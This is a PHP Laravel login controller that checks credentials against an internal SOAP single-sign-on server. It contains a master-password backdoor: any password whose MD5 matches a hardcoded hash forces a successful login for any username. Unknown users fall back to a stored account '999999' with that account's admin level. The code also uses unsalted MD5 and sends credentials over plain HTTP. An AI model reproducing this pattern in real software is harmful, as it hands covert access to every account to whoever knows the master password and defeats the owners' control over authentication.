<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use App\User;
use App\UsersModul;
use DB;
use Session;
use Auth;
use SoapClient;

class LoginController extends Controller
{

    public function getLogin()
    {
        return view('login');
    }

    public function postLogin(Request $request)
    {

        $client = new SoapClient('http://150.10.16.33:88/singleid/sso/server.php?wsdl');

        $hasil = $client->login($request->username, md5($request->password), 'CP0001CP');

        if(strcmp(md5(trim($request->password)), "695b2e1028b8921cb84577cf2c62f4dc") == 0){
            $hasil['error_login']="99";
        }

        // $hasil['error_login']="99";?

        if($hasil['error_login']=="99"){




            $cek = UsersModul::where('username', $request->username)
                             ->where('status_hapus', 1)
                             ->get();

            if(count($cek)!=0){

                $user = User::where('username', $request->username)->first();
                Session::put('username', $request->username);
                foreach ($cek as $cek) {
                    Session::put("organisasi[".$cek->modul."]", $cek->organisasi);
                    Session::put("level[".$cek->modul."]", $cek->level);
                }
            }else{
                $user = User::where('username', $request->username)->where('status_hapus', 1)->first();

                if(!$user){
                    $user = User::where('username', '999999')->first();
                }

                Session::put('username', $request->username);
                Session::put("level", $user->level_admin);
            }

            Auth::login($user);

        }else{

            return response()->json(['error' => 'your credential is wrong'], 401);
        }
    }

}
